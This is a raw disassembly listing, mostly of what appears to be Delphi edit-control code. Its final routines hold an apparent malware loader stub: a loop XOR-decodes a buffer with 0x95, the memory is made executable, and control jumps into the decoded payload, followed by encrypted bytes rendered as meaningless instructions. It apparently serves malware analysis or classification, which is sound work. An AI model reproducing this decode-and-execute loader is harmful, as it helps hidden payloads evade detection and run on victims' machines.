jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_48aebc
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_48aebc
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_48ae98
mov eax ebx
call sub_48b12c
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_48ae98
mov eax ebx
call sub_48b12c
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_48b6e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_48b7ec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b7f3
lea eax [ ebp - 0xc ]
call sub_404038
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_48ae74
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_48a9d4
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_48c198
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_404558
mov eax [ ebp - 0xc ]
call sub_4044f8
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_48b598
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_48ae74
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_48ae74
mov edx [ edi ]
dec edx
mov eax ebx
call sub_48aebc
mov edx [ edi ]
mov eax ebx
call sub_48b5b4
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_48aebc
jmp r-xdata
sub_48b7fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403a3c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44304c
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_48b12c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48a9d4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_40408c
mov edx esi
mov eax ebx
call sub_44304c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b886
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_48b88c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_48b90d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_443088
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_48a9d4
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_40408c
mov eax ebx
call sub_4533bc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b914
lea eax [ ebp - 0xc ]
call sub_404038
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_48ae74
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_48b5b4
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_48aebc
sub_48b91c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
mov eax ebx
call sub_4428cc
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_48b954
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48ac9c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4524e0
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_48b12c
sub_48b988
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_48ba1a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_48a9d4
mov eax esi
call sub_48ac9c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ba21
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
call sub_4428cc
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_48aebc
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_48ba28
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
pop ecx
pop edx
pop ebx
retn
sub_48ba64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_4893d8
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_4893d8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_48baac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48bc72
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_40408c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_4042f8
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_48933c
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_4042f8
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_4042f8
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_4042f8
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_404558
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_404558
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_404344
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bc79
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40405c
retn
mov eax [ esi ]
call sub_4042f8
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_4042f8
mov edx eax
dec edx
mov eax esi
call sub_404684
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_4042f8
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_404558
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_4891e8
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_404504#2
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_48bc80
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4897c4
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4891e8
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_48be14
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_48c4f4
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_489770
mov edi eax
mov edx edi
mov eax esi
call sub_48aebc
jmp r-xdata
sub_48bd34
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_48be02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_489770
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_4042f8
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402a54
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402a54
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_48a9d4
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40c38c
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_48a9d4
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40c38c
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48be09
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_48be14
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403a3c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4891e8
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_48933c
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_4893b8
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c0cd
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_40405c
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0x10 ]
call j_sub_404504#2
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_48bd1c
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_48bd34
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_48bd34
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4040d0
lea eax [ ebp - 0x10 ]
call j_sub_404504#2
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_40806c
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_4040d0
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_40806c
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_4040d0
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_4080a0
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_4040d0
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_4080a0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4040d0
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_48c0db
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_4042f8
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_4891e8
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_48c198
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4897c4
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_4042f8
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_404504#2
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_4891e8
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_48c230
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_48c4e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c4e7
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_40405c
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_4040d0
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_4897c4
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4042f8
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4891e8
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_4042f8
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_48be14
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40c38c
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4042f8
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40c38c
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404558
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404558
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_404344
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_404558
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4042f8
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_4042f8
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_404558
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043b8
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_404220
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404300
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_404504#2
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_404504#2
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_4042f8
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404558
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_404220
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4042f8
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_404558
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4043b8
inc edi
sub_48c4f4
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_4042f8
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4891e8
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_4893b8
mov edx eax
mov ebp edi
jmp r-xdata
sub_48c550
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a3c#8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48c57c
retn
sub_48c824
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
nop
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_48c850
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
nop
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebp - 0x9 ] al
nop
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
nop
xor [ ebp - 0x9 ] 0x95
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
nop
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x5b4b
jne r-xdata
mov esp ebp
pop ebp
retn
sub_48c894
push ebp
mov ebp esp
add esp 0xfffffff0
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
nop
nop
push r-xdata
call sub_48c894
add eax 0x5050505
add eax 0xc6050505
sbb al dl
jns r-xdata
nop
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5b4a
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov eax [ ebp + 0x8 ]
call sub_48c850
nop
mov eax [ ebp + 0x8 ]
add eax 0x201e
mov [ ebp - 0x4 ] eax
nop
jmp [ ebp - 0x4 ]
jl r-xdata
int3
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
jl r-xdata
jge r-xdata
rcl [ ebp + 0x7c050595 ] 0xe2
fst [ ebp + 0x5050595 ]
xchg ebp eax
add eax 0xcd050505
push ecx
sbb al 0xd0
jge r-xdata
push 0x6a
push 0xffffffe0
cmp [ esp + ecx * 8 - 0x51 ] 0xc6059595
retn
sbb [ eax ] dl
rcl [ ebp + 0x1cf30595 ] 0xe8
popad
jl r-xdata
push 0xffffffe0
jge r-xdata
jmp edi
jl r-xdata
retn 0x9595
add eax 0x61d81c05
sbb al 0xc0
insd
push ds
shr [ ecx + 0x1c ] 0x1
shl [ ecx + 0x7c ] 0x1
popfd
test al 0x95
xchg ebp eax
add eax 0x69e8ac05
0x95d78711 0x7c95
movsd [ edi ] [ esi ]
0x64fd9595 0xfc88
aad 0x6a
and edx [ ecx - 0x6b ]
xchg ebp eax
xchg ebp eax
push ds
imul edi [ ebp + 0x47 ] 0xffffff82
xchg ebp eax
xchg ebp eax
push ss
push ecx
cdq
test al 0xf5
jg r-xdata
or eax 0x59595a0
add eax 0x5050505
add eax 0xabfd7d05
xchg ebp eax
xchg ebp eax
push ss
push ecx
cdq
std
xchg ebp eax
